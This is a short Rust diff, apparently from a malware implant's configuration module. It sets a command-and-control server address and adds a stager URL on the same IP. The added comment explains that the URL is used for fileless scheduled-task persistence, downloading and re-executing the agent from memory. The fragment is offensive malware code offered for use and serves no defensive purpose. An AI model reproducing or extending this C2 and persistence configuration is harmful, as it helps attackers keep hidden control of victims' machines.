@@ -10,3 +10,7 @@ pub fn get_c2_server() -> &'static str {
 }
 
 pub const C2_SERVER: &str = "45.154.98.72:4444";
+
+/// URL from which the stager (ester.exe) is served by the C2 server.
+/// Used by fileless scheduled-task persistence to download & re-exec the agent from memory.
+pub const STAGER_URL: &str = "http://45.154.98.72:5555/api/stage0/ester";
